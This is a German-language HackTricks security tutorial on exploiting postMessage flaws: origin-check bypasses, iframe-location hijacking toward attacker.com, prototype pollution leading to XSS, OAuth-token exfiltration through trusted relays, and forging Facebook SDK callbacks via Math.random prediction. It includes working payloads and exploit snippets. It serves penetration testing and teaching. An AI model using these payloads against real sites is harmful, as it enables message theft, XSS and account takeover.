# PostMessage Schwachstellen

{{#include ../../banners/hacktricks-training.md}}

## Senden von **PostMessage**

**PostMessage** verwendet die folgende Funktion, um eine Nachricht zu senden:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Beachte, dass **targetOrigin** '\*' oder eine URL wie _https://company.com._ sein kann.\
Im **zweiten Szenario** kann die **message nur an diese Domain gesendet werden** (auch wenn die origin of the Window object unterschiedlich ist).\
Wenn das **wildcard** verwendet wird, **können messages an jede Domain gesendet werden**, und sie werden an die origin of the Window object gesendet.

### Attacking iframe & wildcard in **targetOrigin**

Wie in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) erklärt, wenn du eine Seite findest, die **iframed** werden kann (kein `X-Frame-Header`-Schutz) und die **sending sensitive** message via **postMessage** using a **wildcard** (\*), kannst du die **origin** des **iframe** modifizieren und die **sensitive** message an eine von dir kontrollierte Domain leak.\
Beachte, dass dieser Trick nicht funktioniert, wenn die Seite iframed werden kann, die **targetOrigin** jedoch **auf eine URL gesetzt ist und nicht auf ein wildcard**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## Ausnutzung von addEventListener

**`addEventListener`** ist die Funktion, die von JS verwendet wird, um die Funktion zu deklarieren, die **`postMessages` erwartet**.\
Ein Code ähnlich dem folgenden wird verwendet:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Beachte in diesem Fall, wie das **erste**, was der Code tut, **die Origin prüft**. Das ist enorm **wichtig**, vor allem wenn die Seite irgendetwas Sensibles mit den empfangenen Informationen macht (z. B. ein Passwort ändern). **Wenn sie die Origin nicht prüft, können Angreifer Opfer dazu bringen, beliebige Daten an diese Endpunkte zu senden** und in diesem Beispiel die Passwörter der Opfer zu ändern.

### Enumeration

Um **Event Listener** auf der aktuellen Seite zu finden, kannst du:

- **Im JS-Code suchen** nach `window.addEventListener` und `$(window).on` (_JQuery-Version_)
- **In der Developer-Tools-Konsole ausführen:** `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Gehe zu** _Elements --> Event Listeners_ in den Developer Tools des Browsers

![](<../../images/image (396).png>)

- Verwende eine **Browser-Erweiterung** wie [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) oder [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Diese Browser-Erweiterungen **fangen alle Nachrichten ab** und zeigen sie dir an.

### Origin check bypasses

- Das Attribut **`event.isTrusted`** gilt als sicher, da es `True` nur für Ereignisse zurückgibt, die durch echte Benutzeraktionen erzeugt wurden. Obwohl es schwer zu umgehen ist, wenn korrekt implementiert, ist seine Bedeutung in Sicherheitsprüfungen bemerkenswert.
- Die Verwendung von **`indexOf()`** zur Origin-Validierung bei PostMessage-Events kann umgehbar sein. Ein Beispiel, das diese Verwundbarkeit veranschaulicht, ist:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- Die **`search()`**-Methode von `String.prototype.search()` ist für reguläre Ausdrücke gedacht, nicht für einfache Strings. Wird etwas anderes als ein RegExp übergeben, erfolgt eine implizite Konvertierung zu einem RegExp, wodurch die Methode potenziell unsicher wird. Das liegt daran, dass im RegExp ein Punkt (.) als Wildcard fungiert, was eine Umgehung der Validierung mit speziell konstruierten Domains erlaubt. Zum Beispiel:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- Die **`match()`**-Funktion verarbeitet ähnlich wie `search()` Regex. Wenn das Regex falsch aufgebaut ist, kann es zu Umgehungen kommen.
- Die **`escapeHtml`**-Funktion soll Eingaben durch Escaping von Zeichen sanitizen. Sie erzeugt jedoch kein neues escaped-Objekt, sondern überschreibt die Eigenschaften des bestehenden Objekts. Dieses Verhalten kann ausgenutzt werden. Insbesondere wenn ein Objekt so manipuliert werden kann, dass seine kontrollierte Eigenschaft `hasOwnProperty` nicht erkennt, funktioniert `escapeHtml` nicht wie erwartet. Das wird in den folgenden Beispielen demonstriert:

- Erwartetes Scheitern:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Umgehung des Escapings:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

Im Kontext dieser Verwundbarkeit ist das `File`-Objekt besonders ausnutzbar aufgrund seiner schreibgeschützten `name`-Property. Diese Property wird beim Verwenden in Templates nicht von der `escapeHtml`-Funktion saniert, was zu potentiellen Sicherheitsrisiken führt.

- Die Property `document.domain` in JavaScript kann von einem Script gesetzt werden, um die Domain zu verkürzen, wodurch eine lockerere same-origin-Policy innerhalb der gleichen Parent-Domain möglich wird.

### Origin-only trust + trusted relays

Wenn ein Receiver nur **`event.origin`** prüft (z. B. vertraut allen `*.trusted.com`), findest du oft eine **"relay" page auf dieser Origin, die angreifer-kontrollierte Params via `postMessage`** an ein angegebenes `targetOrigin`/`targetWindow` zurückspiegelt. Beispiele sind Marketing-/Analytics-Gadgets, die Query-Parameter nehmen und `{msg_type, access_token, ...}` an `opener`/`parent` weiterleiten. Du kannst:

- **Die Opferseite in einem Popup/iframe öffnen, das ein `opener` hat**, sodass dessen Handler registriert werden (viele Pixels/SDKs hängen Listener nur an, wenn `window.opener` existiert).
- **Ein anderes Angreifer-Fenster zur Relay-Endpoint der trusted Origin navigieren**, und die Message-Felder mit den von dir gewünschten Werten füllen (message type, tokens, nonces).
- Weil die Nachricht jetzt **von der trusted Origin** kommt, besteht die Origin-only-Validierung und du kannst privilegierte Aktionen (State-Änderungen, API-Aufrufe, DOM-Schreibzugriffe) im Listener des Opfers auslösen.

Missbrauchsmuster aus der Praxis:

- Analytics-SDKs (z. B. pixel/fbevents-artig) konsumieren Nachrichten wie `FACEBOOK_IWL_BOOTSTRAP`, rufen dann **Backend-APIs unter Verwendung eines im Message gelieferten Tokens** auf und fügen **`location.href` / `document.referrer`** in den Request-Body ein. Wenn du dein eigenes Token lieferst, kannst du **diese Requests im Request-History/Log des Tokens lesen** und OAuth-Codes/Token, die in der URL/Referrer der Opferseite vorhanden sind, exfiltrieren.
- Jede Relay, die beliebige Felder in `postMessage` reflektiert, erlaubt es dir, **Message-Types zu spoofen**, die von privilegierten Listenern erwartet werden. Kombiniert mit schwacher Input-Validierung lässt sich so Zugriff auf Graph/REST-Calls, Feature-Unlocks oder CSRF-ähnliche Flows erreichen.

Hunting-Tipps: enumriere `postMessage`-Listener, die nur `event.origin` prüfen, und suche dann nach **gleich-origin HTML/JS Endpoints, die URL-Parameter via `postMessage` weiterleiten** (Marketing-Previews, Login-Popups, OAuth-Error-Seiten). Verknüpfe beides mit `window.open()` + `postMessage`, um Origin-Prüfungen zu umgehen.

### e.origin == window.origin bypass

Beim Einbetten einer Seite in ein **sandboxed iframe** mit %%%%%% ist es wichtig zu verstehen, dass die Origin des iframes auf null gesetzt wird. Das ist besonders relevant im Umgang mit sandbox-Attributen und deren Auswirkungen auf Sicherheit und Funktionalität.

Wenn im sandbox-Attribut **`allow-popups`** angegeben ist, erben Popups, die aus dem iframe geöffnet werden, die Sandbox-Einschränkungen des Parents. Das bedeutet, dass das Popup-Fenster nur dann nicht ebenfalls die Origin `null` erhält, wenn zusätzlich das Attribut **`allow-popups-to-escape-sandbox`** gesetzt ist.

Folglich, wenn unter diesen Bedingungen ein Popup geöffnet wird und eine Nachricht vom iframe an das Popup mittels **`postMessage`** gesendet wird, haben sowohl Sender als auch Empfänger ihre Origin auf `null` gesetzt. Dadurch ergibt sich die Situation, dass **`e.origin == window.origin`** als true ausgewertet wird (`null == null`), weil sowohl iframe als auch Popup denselben Origin-Wert `null` teilen.

Für mehr Informationen **lies**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassing e.source

Es ist möglich zu prüfen, ob die Nachricht aus demselben Fenster stammt, in dem das Script lauscht (besonders interessant für **Content Scripts from browser extensions**, um zu prüfen, ob die Nachricht von derselben Seite gesendet wurde):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Du kannst erzwingen, dass **`e.source`** einer Nachricht null ist, indem du ein **iframe** erstellst, das die **postMessage** **sendet** und sofort gelöscht wird.

Für weitere Informationen **lies:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Um diese Angriffe idealerweise durchzuführen, solltest du die **Webseite des Opfers** innerhalb eines `iframe` platzieren können. Aber manche Header wie `X-Frame-Header` können dieses **Verhalten** **verhindern**.\
In solchen Szenarien kannst du trotzdem einen weniger unauffälligen Angriff verwenden. Du kannst einen neuen Tab zur verwundbaren Webanwendung öffnen und mit ihr kommunizieren:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Nachricht stehlen, die an ein child iframe gesendet wird, indem die main Seite blockiert wird

Auf der folgenden Seite sehen Sie, wie Sie **sensitive postmessage data**, die an ein **child iframe** gesendet wird, stehlen können, indem Sie die **main** Seite vor dem Senden der Daten **blockieren** und eine **XSS in the child** ausnutzen, um die Daten zu **leak**en, bevor sie empfangen werden:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Nachricht stehlen durch Ändern der iframe-Location

Wenn Sie eine Webseite ohne X-Frame-Header iframen können, die ein weiteres iframe enthält, können Sie **die location dieses child iframe ändern**, sodass, wenn es eine **postmessage** empfängt, die mit einem **wildcard** gesendet wurde, ein Angreifer die **origin** dieses iframe zu einer von ihm **kontrollierten** Seite **ändern** und die Nachricht **stehlen** könnte:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage zu Prototype Pollution und/oder XSS

In Szenarien, in denen die per `postMessage` gesendeten Daten von JS ausgeführt werden, können Sie die **page** iframen und die **prototype pollution/XSS** ausnutzen, indem Sie den Exploit via `postMessage` senden.

Einige **sehr gut erklärte XSS durch `postMessage`** finden Sie unter [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Beispiel eines Exploits, um **Prototype Pollution und anschließend XSS** durch eine `postMessage` an ein `iframe` auszunutzen:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Für **weitere Informationen**:

- Link zur Seite über [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link zur Seite über [**XSS**](../xss-cross-site-scripting/index.html)
- Link zur Seite über [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Vorhersage von **`Math.random()`** Callback-Tokens in postMessage-Bridges

Wenn die Nachrichtenvalidierung ein mit `Math.random()` generiertes „gemeinsames Geheimnis“ verwendet (z. B. `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) und derselbe Helfer außerdem Plugin-iframes benennt, können Sie PRNG-Ausgaben rekonstruieren und vertrauenswürdige Nachrichten fälschen:

- **Leak PRNG outputs via `window.name`:** Das SDK benennt Plugin-iframes automatisch mit `guid()`. Wenn Sie den Top-Frame kontrollieren, iframe die Opferseite, navigieren dann das Plugin-iframe zu Ihrer Origin (z. B. `window.frames[0].frames[0].location='https://attacker.com'`) und lesen `window.frames[0].frames[0].name`, um eine rohe `Math.random()`-Ausgabe zu erhalten.
- **Mehr Ausgaben erzwingen ohne Reloads:** Einige SDKs bieten einen Reinit-Pfad; im FB SDK erzwingt das Abschicken von `init:post` mit `{xfbml:1}` `XFBML.parse()`, zerstört/erstellt das Plugin-iframe neu und erzeugt neue Namen/Callback-IDs. Wiederholtes Reinit erzeugt so viele PRNG-Ausgaben wie nötig (beachte zusätzliche interne `Math.random()`-Aufrufe für Callback-/Iframe-IDs, daher müssen die Solver zwischenliegende Werte überspringen).
- **Trusted-origin delivery via parameter pollution:** Wenn ein First-Party-Plugin-Endpoint einen ungesäuberten Parameter in die cross-window-Payload zurückspiegelt (z. B. `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), können Sie `&type=...&iconSVG=...` injizieren und gleichzeitig die vertrauenswürdige `facebook.com`-Origin beibehalten.
- **Predict the next callback:** Konvertieren Sie leaked Iframe-Namen zurück in Fließkommazahlen in `[0,1)` und geben mehrere Werte (auch nicht aufeinanderfolgende) in einen V8 `Math.random`-Prädiktor (z. B. Z3-basiert). Generieren Sie das nächste `guid()` lokal, um das erwartete Callback-Token zu fälschen.
- **Trigger the sink:** Konstruieren Sie die postMessage-Daten so, dass die Bridge `xd.mpn.setupIconIframe` dispatcht und HTML in `iconSVG` injiziert (z. B. URL-kodiertes `<img src=x onerror=...>`), wodurch DOM XSS innerhalb der Hosting-Origin erreicht wird; von dort aus können same-origin iframes (OAuth-Dialoge, arbiters, etc.) ausgelesen werden.
- **Framing quirks helfen:** Die Kette erfordert Framing. In manchen mobilen Webviews kann `X-Frame-Options` zu dem nicht unterstützten `ALLOW-FROM` degradiert werden, wenn `frame-ancestors` vorhanden ist, und „compat“-Parameter können permissive `frame-ancestors` erzwingen, wodurch der `window.name` Side-Channel möglich wird.

#### Minimales Beispiel einer gefälschten Nachricht
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referenzen

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Leaking fbevents: OAuth code exfiltration via postMessage trust leading to Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- Zum Üben: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
